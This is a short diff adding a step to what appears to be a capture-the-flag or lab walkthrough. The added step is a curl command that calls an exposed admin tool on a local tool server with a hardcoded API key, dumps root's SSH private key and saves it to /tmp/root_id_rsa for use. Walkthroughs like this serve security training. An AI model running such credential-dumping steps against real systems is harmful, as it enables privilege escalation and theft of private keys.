@@ -1938,7 +1938,20 @@ Breakdown:
 
 We have root's private key — but it's wrapped in JSON with literal \n escape sequences, so we need to extract and unescape it properly into a usable key file.
 
+**Commands:**
 
+```bash
+curl -s http://localhost:15000/tools/call \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
+| python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])" \
+> /tmp/root_id_rsa
+
+chmod 600 /tmp/root_id_rsa
+```
+
+Breakdown:
 <div align="center">
 <br>
 <br>
